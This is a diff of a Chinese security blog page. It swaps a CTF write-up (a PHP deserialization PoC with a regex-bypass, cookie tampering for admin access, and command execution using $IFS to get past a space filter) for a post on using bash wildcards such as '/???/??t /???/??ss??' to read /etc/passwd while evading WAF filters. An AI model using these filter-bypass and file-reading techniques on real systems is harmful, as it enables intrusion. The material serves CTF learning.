@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="CTF,">
+  <meta name="keywords" content="系统总结,">
 
 
 
@@ -86,28 +86,22 @@
 
 
 
-<meta name="description" content="WEBeasy题目是如下代码 &amp;lt;?php   @error_reporting(1);  include &amp;apos;flag.php&amp;apos;; class baby  {    public $file; function __toString()   {   if(isset($this-&amp;gt;file))  { $filename = &amp;quot;./{$this-&amp;gt;fil">
-<meta name="keywords" content="CTF">
+<meta name="description" content="关于bash通配符有以下几个  ?是匹配一个任意字符.也就是说如果我们平时执行的是cat /etc/passwd可以用?来替代 例如： root@bee-box:~# which ls /bin/ls root@bee-box:~# echo /???/?s /bin/ls /bin/ps /sys/fs root@bee-box:~# 可以用/???/?s来取代.类似的cat也是可以用/???/">
+<meta name="keywords" content="系统总结">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2018安恒12月赛复现">
-<meta property="og:url" content="https://yml-sec.top/2019/01/13/2018安恒12月赛复现/index.html">
+<meta property="og:title" content="bash通配符与命令执行">
+<meta property="og:url" content="https://yml-sec.top/2019/02/14/bash通配符与命令执行/index.html">
 <meta property="og:site_name" content="yemoli&#39;s blog">
-<meta property="og:description" content="WEBeasy题目是如下代码 &amp;lt;?php   @error_reporting(1);  include &amp;apos;flag.php&amp;apos;; class baby  {    public $file; function __toString()   {   if(isset($this-&amp;gt;file))  { $filename = &amp;quot;./{$this-&amp;gt;fil">
+<meta property="og:description" content="关于bash通配符有以下几个  ?是匹配一个任意字符.也就是说如果我们平时执行的是cat /etc/passwd可以用?来替代 例如： root@bee-box:~# which ls /bin/ls root@bee-box:~# echo /???/?s /bin/ls /bin/ps /sys/fs root@bee-box:~# 可以用/???/?s来取代.类似的cat也是可以用/???/">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://i.imgur.com/cyhUSm9.jpg">
-<meta property="og:image" content="https://i.imgur.com/RzSw8v1.jpg">
-<meta property="og:image" content="https://i.imgur.com/iCGwMkz.jpg">
-<meta property="og:image" content="https://i.imgur.com/EI5QmO5.jpg">
-<meta property="og:image" content="https://i.imgur.com/alpFdrk.jpg">
-<meta property="og:image" content="https://i.imgur.com/b2BFPjZ.jpg">
-<meta property="og:image" content="https://i.imgur.com/OxFdjul.jpg">
-<meta property="og:image" content="https://i.imgur.com/z5zuUKL.jpg">
-<meta property="og:image" content="https://i.imgur.com/z7Hp9Xc.jpg">
-<meta property="og:updated_time" content="2019-01-13T07:28:04.205Z">
+<meta property="og:image" content="https://i.imgur.com/sFNctFU.png">
+<meta property="og:image" content="https://i.imgur.com/QhXGe1H.jpg">
+<meta property="og:image" content="https://i.imgur.com/6RgwSGp.jpg">
+<meta property="og:updated_time" content="2019-02-14T13:49:35.311Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2018安恒12月赛复现">
-<meta name="twitter:description" content="WEBeasy题目是如下代码 &amp;lt;?php   @error_reporting(1);  include &amp;apos;flag.php&amp;apos;; class baby  {    public $file; function __toString()   {   if(isset($this-&amp;gt;file))  { $filename = &amp;quot;./{$this-&amp;gt;fil">
-<meta name="twitter:image" content="https://i.imgur.com/cyhUSm9.jpg">
+<meta name="twitter:title" content="bash通配符与命令执行">
+<meta name="twitter:description" content="关于bash通配符有以下几个  ?是匹配一个任意字符.也就是说如果我们平时执行的是cat /etc/passwd可以用?来替代 例如： root@bee-box:~# which ls /bin/ls root@bee-box:~# echo /???/?s /bin/ls /bin/ps /sys/fs root@bee-box:~# 可以用/???/?s来取代.类似的cat也是可以用/???/">
+<meta name="twitter:image" content="https://i.imgur.com/sFNctFU.png">
 
 
 
@@ -137,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="https://yml-sec.top/2019/01/13/2018安恒12月赛复现/">
+  <link rel="canonical" href="https://yml-sec.top/2019/02/14/bash通配符与命令执行/">
 
 
 
 
 
-  <title>2018安恒12月赛复现 | yemoli's blog</title>
+  <title>bash通配符与命令执行 | yemoli's blog</title>
   
 
 
@@ -269,7 +263,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/01/13/2018安恒12月赛复现/">
+    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/02/14/bash通配符与命令执行/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="夜莫离、">
@@ -286,7 +280,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">2018安恒12月赛复现</h1>
+          <h1 class="post-title" itemprop="name headline">bash通配符与命令执行</h1>
         
 
         <div class="post-meta">
@@ -298,8 +292,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-13T14:12:16+08:00">
-                2019-01-13
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-14T21:34:40+08:00">
+                2019-02-14
               </time>
             
 
@@ -330,7 +324,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  385
+                  276
                 </span>
               
 
@@ -367,93 +361,30 @@
       
 
       
-        <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h2><p>题目是如下代码</p>
-<pre><code>&lt;?php  
-@error_reporting(1); 
-include &apos;flag.php&apos;;
-class baby 
-{   
-public $file;
-function __toString()  
-{  
-if(isset($this-&gt;file)) 
-{
-$filename = &quot;./{$this-&gt;file}&quot;;
-if (file_get_contents($filename)) 
-{  
-return file_get_contents($filename); 
-} 
-} 
-}  
-}  
-if (isset($_GET[&apos;data&apos;]))  
-{ 
-$data = $_GET[&apos;data&apos;];
-preg_match(&apos;/[oc]:\d+:/i&apos;,$data,$matches);
-if(count($matches))
-{
-die(&apos;Hacker!&apos;);
-}
-else
-{
-$good = unserialize($data);
-echo $good;
-} 
-} 
-else 
-{ 
-highlight_file(&quot;./index.php&quot;); 
-} 
-?&gt;
-</code></pre><p>很显然是一个反序列化漏洞</p>
-<p>将参数改为flag.php即可读取到flag文件</p>
-<p>生成poc的代码如下</p>
-<pre><code>&lt;?php  
-@error_reporting(1); 
-class baby 
-{   
-public $file = &quot;flag.php&quot;;
-function __toString()  
-{  
-if(isset($this-&gt;file)) 
-{
-$filename = &quot;./{$this-&gt;file}&quot;;
-if (file_get_contents($filename)) 
-{  
-return file_get_contents($filename); 
-} 
-} 
-}  
-}  
-$a = new baby();
-echo serialize($a);
-?&gt;
-</code></pre><p>本地访问页面生成的反序列化字符串为：</p>
-<pre><code>O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
-</code></pre><p>将该串内容作为data的值传入，发现被waf拦截</p>
-<p><img src="https://i.imgur.com/cyhUSm9.jpg" alt=""></p>
-<p>仔细查看题目正则部分，用+4绕过即可</p>
-<p><img src="https://i.imgur.com/RzSw8v1.jpg" alt=""></p>
-<h2 id="ezweb2"><a href="#ezweb2" class="headerlink" title="ezweb2"></a>ezweb2</h2><p>使用御剑扫描目录发现了admin.php文件，访问后提示：</p>
-<p><img src="https://i.imgur.com/iCGwMkz.jpg" alt=""></p>
-<p>提示不是admin，下意识的查看cookie</p>
-<p><img src="https://i.imgur.com/EI5QmO5.jpg" alt=""></p>
-<p>将user部分base64解码得到user,我们将admin base64编码后将其替换</p>
-<p>进入到后台</p>
-<p><img src="https://i.imgur.com/alpFdrk.jpg" alt=""></p>
-<p>发现可以命令执行，但是过滤了空格</p>
-<p>空格可以使用$IFS绕过</p>
-<p>ls$IFS/<br><img src="https://i.imgur.com/b2BFPjZ.jpg" alt=""></p>
-<p>读取flag文件</p>
-<p><img src="https://i.imgur.com/OxFdjul.jpg" alt=""></p>
-<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h2><p>拿到文件后很明显是明文攻击</p>
-<p>跑出密码</p>
-<p>打开解压后的Word文档，将图片移走，得到flag</p>
-<p><img src="https://i.imgur.com/z5zuUKL.jpg" alt=""></p>
-<h2 id="JUJU"><a href="#JUJU" class="headerlink" title="JUJU"></a>JUJU</h2><p>题目提示有11只猪，而打开图片明显数量不足，尝试修改图片高度</p>
-<p>发现了base32编码</p>
-<p><img src="https://i.imgur.com/z7Hp9Xc.jpg" alt=""></p>
-<p>解密后得到flag</p>
+        <p>关于bash通配符有以下几个</p>
+<p><img src="https://i.imgur.com/sFNctFU.png" alt=""></p>
+<p>?是匹配一个任意字符.也就是说如果我们平时执行的是cat /etc/passwd可以用?来替代</p>
+<p>例如：</p>
+<pre><code>root@bee-box:~# which ls
+/bin/ls
+root@bee-box:~# echo /???/?s
+/bin/ls /bin/ps /sys/fs
+root@bee-box:~#
+</code></pre><p>可以用/???/?s来取代.类似的cat也是可以用/???/??t或者/???/c?t等来查找到.如果在绕waf的过程里面应该是可以直接拿出来用的.</p>
+<pre><code>root@bee-box:~# echo /???/c?t
+/bin/cat
+root@bee-box:~# echo /???/??t
+/bin/cat /dev/net /etc/apt /etc/opt /etc/rmt /var/opt
+</code></pre><p>试试常见的cat /etc/passwd<br>我们用/???/??t /???/??ss??来替换</p>
+<p>cat /etc/passwd</p>
+<p><img src="https://i.imgur.com/QhXGe1H.jpg" alt=""></p>
+<p>/???/??t /???/??ss??</p>
+<p><img src="https://i.imgur.com/6RgwSGp.jpg" alt=""></p>
+<p>可以看到达到了同样的效果</p>
+<p>在安恒月赛里出现过一道题目：<br>    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>字母和数字都被过滤了，我们就可以利用上面的特性</p>
+<p>/???/??? =&gt; /bin/cat</p>
+<p>详细的wp在安全客:<a href="https://www.anquanke.com/post/id/160582?from=singlemessage" target="_blank" rel="noopener">https://www.anquanke.com/post/id/160582?from=singlemessage</a></p>
 
       
     </div>
@@ -500,7 +431,7 @@ echo serialize($a);
       
         <div class="post-tags">
           
-            <a href="/tags/CTF/" rel="tag"># CTF</a>
+            <a href="/tags/系统总结/" rel="tag"># 系统总结</a>
           
         </div>
       
@@ -513,8 +444,8 @@ echo serialize($a);
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/01/12/PHP反序列化总结/" rel="next" title="PHP反序列化总结">
-                <i class="fa fa-chevron-left"></i> PHP反序列化总结
+              <a href="/2019/02/12/Python沙箱逃逸小结/" rel="next" title="Python沙箱逃逸小结">
+                <i class="fa fa-chevron-left"></i> Python沙箱逃逸小结
               </a>
             
           </div>
@@ -522,10 +453,6 @@ echo serialize($a);
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/01/15/PHP利用回溯次数限制绕过/" rel="prev" title="PHP利用回溯次数限制绕过">
-                PHP利用回溯次数限制绕过 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -577,17 +504,8 @@ echo serialize($a);
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -662,22 +580,6 @@ echo serialize($a);
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#easy"><span class="nav-number">1.1.</span> <span class="nav-text">easy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezweb2"><span class="nav-number">1.2.</span> <span class="nav-text">ezweb2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#学习资料"><span class="nav-number">2.1.</span> <span class="nav-text">学习资料</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JUJU"><span class="nav-number">2.2.</span> <span class="nav-text">JUJU</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
